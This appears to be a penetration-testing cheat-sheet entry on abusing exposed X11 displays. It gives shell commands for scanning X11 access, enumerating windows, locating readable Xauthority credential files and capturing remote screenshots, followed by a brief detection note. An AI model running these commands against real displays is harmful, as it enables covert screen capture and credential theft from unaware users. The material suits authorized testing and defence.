# X11 Session Abuse

X11 session abuse targets exposed displays or readable Xauthority material to inspect windows, capture screens, or inject input into a graphical session.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Display access | X11 must allow the current host or cookie |
| X11 tools | `xdpyinfo`, `xwininfo`, or `xwd` must be available |
| Network reachability | Remote X11 commonly uses TCP 6000 plus display number |

## Linux

### Check X11 access

#sh #x11 #recon

Check whether a remote X11 display permits access.

```sh title:"Check X11 access"
nmap -sV --script x11-access -p "$rport" "$rhost_ip"
```

### Display information

#sh #x11 #recon

Query X11 display information.

```sh title:"Query X11 display information"
xdpyinfo -display "$display_target"
```

### Window tree

#sh #x11 #recon

List the X11 root window tree.

```sh title:"List X11 window tree"
xwininfo -root -tree -display "$display_target"
```
<!-- cheat
var display_target
-->

### Find Xauthority files

#sh #x11 #credentials

Find readable Xauthority files under user homes.

```sh title:"Find Xauthority files"
find /home -name .Xauthority -type f 2>/dev/null
```
<!-- cheat -->

### Step 1: Capture X11 screenshot

#sh #x11 #screenshot

Capture the remote X11 root window to an XWD file.

```sh title:"Capture X11 screenshot"
xwd -root -screen -silent -display "$display_target" -out "$xwd_file"
```

### Step 2: Convert XWD screenshot

#sh #x11 #screenshot

Convert an XWD screenshot to PNG.

```sh title:"Convert XWD screenshot to PNG"
convert "$xwd_file" "$png_file"
```

## Detection

Monitor X11 TCP exposure, Xauthority file access, screenshot tooling, and unexpected clients connected to user display sessions.
